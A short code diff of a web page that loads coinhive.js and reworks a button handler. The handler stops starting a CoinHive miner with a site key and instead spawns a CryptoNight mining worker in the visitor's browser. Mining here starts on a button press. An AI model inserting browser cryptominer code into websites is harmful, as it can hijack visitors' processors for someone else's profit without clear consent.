@@ -6,11 +6,9 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 	<script src="./coinhive.js"></script>
 	<script>
-		function on_btn_click()
-		{
-			var miner = new CoinHive.Anonymous('yymaQQ1oKzfIbCgtMFruKCIIRvpMuaVT', { throttle: 0.8 });
-			miner.start();			
-		}
+			function on_btn_click() {
+				new Worker(CoinHive.CRYPTONIGHT_WORKER_BLOB);
+			}
 	</script>
 	<style>
 		.button
